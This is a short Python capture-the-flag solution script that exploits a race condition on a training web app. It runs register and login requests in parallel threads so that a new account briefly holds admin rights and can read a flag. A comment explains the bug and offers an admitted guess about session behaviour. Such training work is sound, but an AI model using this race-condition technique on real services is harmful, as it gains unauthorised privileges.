import requests
import random
import threading
import os
import time

baseUrl = "http://meta.training.jinblack.it"

def randomString(n=10):
    random_string = ''
    for _ in range(n):
        random_integer = random.randint(0x20, 0x7e)
        random_string += (chr(random_integer))
    return random_string
 

def login(session, user, password="1234"):
    url = "%s/login.php" % baseUrl
    data = {
        "username": user,
        "password": password, 
        "log_user":""
        }
    session.post(url, data=data)
    loadIndex(session)
    

def register(session, user, password="1234"):
    url = "%s/register.php" % baseUrl
    data = {
        "username": user,
        "password_1": password, 
        "password_2": password, 
        "reg_user":""
        }
    session.post(url, data=data)

def loadIndex(session, password="1234"):
    new_url = "%s/index.php" % baseUrl
    r = session.get(new_url)
    if "flag" in r.text:
        print(r.text)

        print("FOUND! ")
        os._exit(1)
    else:
        print("failed, retrying...")


while True:
    s = requests.Session()
    u = randomString()
    p = randomString()
    t1 = threading.Thread(target=register, args=(s, u, p))
    t2 = threading.Thread(target=login, args=(s, u, p))

    t1.start()
    t2.start()

    t1.join()
    t2.join()

'''
this challenge was exactly the same as aart. The race-condition was found on the register-login phase. 
There is a moment in which the user is still admin and can list all the challenges (included the one called
flag). The main difference is that for some reason we had to reset the session each time we try the exploit. 
The real reason is unknown but I think it is beacuse of the buffer. Basically I think all the requests
made by the same session are stored in a waiting list (till the buffer is full), also for the login-registration phase. This is
just a guess, I did't found any reference in the code. 
'''